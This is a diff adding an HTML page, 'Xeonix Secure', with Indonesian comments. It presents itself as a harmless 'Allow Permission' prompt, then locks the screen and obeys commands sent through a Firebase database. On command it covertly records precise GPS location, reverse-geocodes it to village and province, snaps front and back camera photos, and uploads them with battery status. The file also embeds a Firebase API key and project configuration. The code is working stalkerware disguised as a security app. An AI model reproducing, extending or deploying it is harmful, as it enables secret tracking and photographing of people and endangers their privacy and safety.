@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Xeonix Secure</title>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --bg-main: #050505;
+  --bg-card: rgba(20, 20, 22, 0.85);
+  --accent: #3b82f6;
+  --accent-hover: #2563eb;
+  --text-main: #f8fafc;
+  --text-muted: #94a3b8;
+  --border: rgba(255, 255, 255, 0.08);
+}
+
+body {
+  margin: 0;
+  font-family: 'Inter', sans-serif;
+  background: var(--bg-main);
+  background-image: radial-gradient(circle at 50% 0%, #1e1b4b 0%, #050505 60%);
+  color: var(--text-main);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  flex-direction: column;
+  text-align: center;
+  overflow: hidden;
+  transition: background 0.1s ease; /* Untuk efek kedip alarm */
+}
+
+#content {
+  background: var(--bg-card);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  padding: 40px 32px;
+  border-radius: 20px;
+  border: 1px solid var(--border);
+  box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255,255,255,0.1);
+  max-width: 90%;
+  width: 340px;
+  box-sizing: border-box;
+  transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+h1 {
+  font-size: 26px;
+  margin-top: 0;
+  margin-bottom: 30px;
+  font-weight: 600;
+  letter-spacing: -0.02em;
+  background: linear-gradient(to right, #fff, #94a3b8);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+button {
+  width: 100%;
+  padding: 16px 24px;
+  border: none;
+  border-radius: 12px;
+  background: linear-gradient(135deg, var(--accent), var(--accent-hover));
+  color: white;
+  font-size: 15px;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+  cursor: pointer;
+  box-shadow: 0 8px 20px rgba(37, 99, 235, 0.25);
+  transition: all 0.2s ease;
+}
+
+button:hover {
+  box-shadow: 0 10px 25px rgba(37, 99, 235, 0.4);
+  transform: translateY(-2px);
+}
+button:active { transform: translateY(0); }
+
+#adminIcon {
+  position: absolute;
+  top: 24px;
+  right: 24px;
+  font-size: 20px;
+  cursor: pointer;
+  color: var(--text-muted);
+  transition: color 0.2s;
+  z-index: 10;
+  background: rgba(255,255,255,0.05);
+  padding: 10px;
+  border-radius: 50%;
+  border: 1px solid var(--border);
+}
+#adminIcon:hover { color: #fff; background: rgba(255,255,255,0.1); }
+
+/* Locked State Styling */
+.locked { background: #000; background-image: none; }
+.locked #content {
+  background: transparent;
+  box-shadow: none;
+  border: none;
+  backdrop-filter: none;
+}
+.locked h1 {
+  font-size: 18px;
+  font-weight: 400;
+  letter-spacing: 6px;
+  color: #ef4444;
+  text-transform: uppercase;
+  background: none;
+  -webkit-text-fill-color: #ef4444;
+  animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0% { opacity: 0.5; }
+  50% { opacity: 1; text-shadow: 0 0 15px rgba(239, 68, 68, 0.5); }
+  100% { opacity: 0.5; }
+}
+</style>
+</head>
+<body>
+
+<div id="adminIcon" onclick="goAdmin()">⚙️</div>
+
+<div id="content">
+<h1>Xeonix Secure</h1>
+<button onclick="activateAll()">Allow Permission</button>
+</div>
+
+<script>
+const firebaseConfig = {
+apiKey: "AIzaSyC71owbERIUTdALLUeTILc9KTWYuZ5TNqQ",
+authDomain: "xeonix-e8b4d.firebaseapp.com",
+databaseURL: "https://xeonix-e8b4d-default-rtdb.asia-southeast1.firebasedatabase.app",
+projectId: "xeonix-e8b4d",
+storageBucket: "xeonix-e8b4d.firebasestorage.app",
+messagingSenderId: "1069914635197",
+appId: "1:1069914635197:web:69cfb35ca50b05ac5670d4"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const deviceId="device1";
+
+const onlineRef = db.ref("devices/"+deviceId+"/online");
+const batteryRef = db.ref("devices/"+deviceId+"/battery");
+
+onlineRef.onDisconnect().set(false);
+batteryRef.onDisconnect().remove();
+
+let isProcessing = false;
+
+function goAdmin(){ window.location.href="admin.html"; }
+
+async function activateAll(){
+  // 1. Meminta Izin Notifikasi (Dibuat terpisah agar aman lintas browser)
+  try {
+    if ("Notification" in window && Notification.permission !== "granted") {
+      Notification.requestPermission();
+    }
+  } catch (e) { console.log("Notifikasi ditolak", e); }
+  
+  // 2. Meminta Izin Lokasi dengan validasi pencegah error
+  let askGPS = new Promise((resolve) => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(resolve, resolve, { timeout: 3000 });
+    } else {
+      resolve();
+    }
+  });
+  
+  // 3. Meminta Izin Kamera dengan validasi pencegah error (fatal crash)
+  let askCam = new Promise((resolve) => {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({video:true})
+        .then(stream => {
+          stream.getTracks().forEach(track=>track.stop());
+          resolve();
+        })
+        .catch(e => {
+          console.log(e);
+          resolve();
+        });
+    } else {
+      resolve();
+    }
+  });
+
+  await Promise.all([askGPS, askCam]);
+
+  lockScreen();
+  listenCommands();
+  sendOnlineStatus(true);
+  sendBattery();
+}
+
+function lockScreen(){
+document.body.classList.add("locked");
+document.getElementById("adminIcon").style.display="none";
+document.getElementById("content").innerHTML="<h1>LOCKED BY XEONIX</h1>";
+}
+
+function listenCommands(){
+db.ref("devices/"+deviceId+"/command").on("value", async (snap)=>{
+let cmd = snap.val();
+if(!cmd) return;
+if(isProcessing) return;
+isProcessing = true;
+try{
+if(cmd === "get_location"){ await getLocation(); }
+if(cmd === "take_photo_front"){ await capturePhoto("user"); }
+if(cmd === "take_photo_back"){ await capturePhoto("environment"); }
+if(cmd === "force_logout"){ forceLogout(); }
+
+}catch(err){ console.log("Command error:", err); }
+await db.ref("devices/"+deviceId+"/command").set(null);
+isProcessing = false;
+});
+}
+
+// UPDATE: FUNGSI getLocation DENGAN GPS WARM-UP & GEOCODING AGRESIF
+function getLocation(){
+  return new Promise((resolve)=>{
+    let bestPos = null;
+    let watchId;
+    let timeoutId;
+    let isResolved = false;
+
+    // Fungsi internal untuk memproses posisi terbaik yang didapat
+    async function processAndSendLocation(pos) {
+      if (isResolved) return;
+      isResolved = true;
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+      if (timeoutId) clearTimeout(timeoutId);
+
+      let lat = pos.coords.latitude;
+      let lon = pos.coords.longitude;
+      let accuracy = pos.coords.accuracy;
+
+      let wilayah = { desa: "-", kecamatan: "-", kabupaten: "-", provinsi: "-" };
+      let apiSukses = false;
+
+      // Coba Nominatim dengan filter variabel super agresif
+      try {
+        let response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`, {
+          headers: { 'User-Agent': 'XeonixSecureSystem/2.0 (contact: admin@xeonix.local)' }
+        });
+        if(response.ok) {
+          let data = await response.json();
+          let addr = data.address;
+          if(addr) {
+            wilayah.desa = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || "-";
+            // Jaring tangkap yang diperlebar agar Kecamatan tidak lolos
+            wilayah.kecamatan = addr.city_district || addr.town || addr.subdistrict || addr.municipality || addr.county || addr.local_administrative_area || "-";
+            wilayah.kabupaten = addr.regency || addr.city || "-";
+            wilayah.provinsi = addr.state || "-";
+            
+            // Merapikan nama kecamatan jika mengandung kata "Kecamatan " dari sananya
+            if(typeof wilayah.kecamatan === "string" && wilayah.kecamatan.toLowerCase().startsWith("kecamatan ")) {
+               wilayah.kecamatan = wilayah.kecamatan.substring(10).trim();
+            }
+            apiSukses = true;
+          }
+        }
+      } catch (e) { console.log("API Utama gagal, mencoba API Cadangan..."); }
+
+      // Backup API
+      if (!apiSukses) {
+        try {
+          let response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`);
+          if(response.ok) {
+            let data = await response.json();
+            wilayah.provinsi = data.principalSubdivision || "-";
+            wilayah.kabupaten = data.city || "-";
+            wilayah.kecamatan = data.locality || "-";
+            if(data.localityInfo && data.localityInfo.informative) {
+              let subLoc = data.localityInfo.informative.find(i => i.order === 4 || i.order === 5);
+              if(subLoc) wilayah.desa = subLoc.name;
+            }
+          }
+        } catch (e) { console.log("Semua API geocoding gagal merespon."); }
+      }
+
+      db.ref("devices/"+deviceId+"/gpsHistory").push({
+        lat: lat, lon: lon, accuracy: accuracy.toFixed(2),
+        desa: wilayah.desa, kecamatan: wilayah.kecamatan, kabupaten: wilayah.kabupaten, provinsi: wilayah.provinsi, time: Date.now()
+      });
+      resolve();
+    }
+
+    // 1. Mulai fase "Warm-up" GPS
+    watchId = navigator.geolocation.watchPosition(
+      (pos) => {
+        // Ambil data posisi jika akurasinya lebih baik (angkanya lebih kecil) dari yang sebelumnya
+        if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) {
+          bestPos = pos;
+        }
+        
+        // Jika akurasinya sudah mantap banget (misal di bawah 15 meter), langsung hajar proses!
+        if (bestPos.coords.accuracy <= 15) {
+          processAndSendLocation(bestPos);
+        }
+      },
+      (error) => {
+        console.log("GPS error:", error.message);
+        if (!bestPos && !isResolved) {
+           isResolved = true;
+           resolve(); // Resolve agar tidak nyangkut
+        }
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+
+    // 2. Timeout "Warm-up" selama 6 detik. Setelah 6 detik, berapapun radius terbaiknya, tetap dikirim
+    timeoutId = setTimeout(() => {
+      if (bestPos && !isResolved) {
+        processAndSendLocation(bestPos);
+      } else if (!isResolved) {
+        isResolved = true;
+        if (watchId) navigator.geolocation.clearWatch(watchId);
+        resolve();
+      }
+    }, 6000);
+  });
+}
+
+async function capturePhoto(mode){
+try{
+let stream=await navigator.mediaDevices.getUserMedia({ video:{facingMode:mode} });
+let video=document.createElement("video");
+video.srcObject=stream;
+await video.play();
+await new Promise(r=>setTimeout(r,200));
+let canvas=document.createElement("canvas");
+canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+canvas.getContext("2d").drawImage(video,0,0);
+let image=canvas.toDataURL("image/jpeg",0.8);
+stream.getTracks().forEach(track=>track.stop());
+await db.ref("devices/"+deviceId+"/photos").push({ image:image, time:Date.now() });
+}catch(e){ console.log("Camera capture error:", e); }
+}
+
+function forceLogout(){
+sendOnlineStatus(false);
+db.ref("devices/"+deviceId+"/battery").remove();
+document.body.classList.remove("locked");
+document.getElementById("adminIcon").style.display="block";
+document.getElementById("content").innerHTML=`
+<h1>Xeonix Secure</h1>
+<button onclick="activateAll()">Allow Permission</button>
+`;
+}
+
+function sendOnlineStatus(status){ db.ref("devices/"+deviceId+"/online").set(status); }
+window.addEventListener("beforeunload",()=>{ sendOnlineStatus(false); });
+
+function sendBattery(){
+if('getBattery' in navigator){
+navigator.getBattery().then(function(battery){
+function updateBattery(){
+db.ref("devices/"+deviceId+"/battery").set({ level: (battery.level * 100).toFixed(1), charging: battery.charging });
+}
+updateBattery();
+battery.addEventListener('levelchange', updateBattery);
+battery.addEventListener('chargingchange', updateBattery);
+});
+}
+}
+</script>
+</body>
+</html>
